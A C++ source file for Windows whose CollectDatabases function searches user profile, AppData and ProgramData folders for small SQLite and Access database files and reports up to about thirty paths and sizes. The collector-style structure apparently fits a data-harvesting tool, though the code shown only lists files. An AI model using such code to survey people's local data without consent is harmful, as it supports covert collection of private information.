#include "database_collector.h"
#include <Windows.h>
#include <shlobj.h>
#include <iostream>
#include <sstream>
#include <filesystem>
#include <vector>

std::string DatabaseCollector::CollectDatabases() {
    std::ostringstream result;
    result << "\n=== DATABASES ===\n";
    
    char userprofile[MAX_PATH], appdata[MAX_PATH], programdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, userprofile);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appdata);
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, programdata);
    
    std::vector<std::string> patterns = {".db", ".sqlite", ".sqlite3", ".mdb"};
    std::vector<std::string> searchPaths = {userprofile, appdata, programdata};
    
    int foundCount = 0;
    for (const auto& searchPath : searchPaths) {
        for (const auto& pattern : patterns) {
            try {
                for (auto& p : std::filesystem::recursive_directory_iterator(searchPath)) {
                    if (p.is_regular_file()) {
                        std::string filename = p.path().extension().string();
                        if (filename == pattern || filename.find(pattern) != std::string::npos) {
                            try {
                                auto fileSize = std::filesystem::file_size(p.path());
                                if (fileSize < 10 * 1024 * 1024) { // Max 10MB
                                    result << "DB: " << p.path().string() << " (" << fileSize << " bytes)\n";
                                    foundCount++;
                                    if (foundCount > 30) break;
                                }
                            } catch (...) {}
                        }
                    }
                }
            } catch (...) {
                // Skip access denied
            }
            if (foundCount > 30) break;
        }
        if (foundCount > 30) break;
    }
    
    result << "Total databases found: " << foundCount << "\n";
    
    return result.str();
}
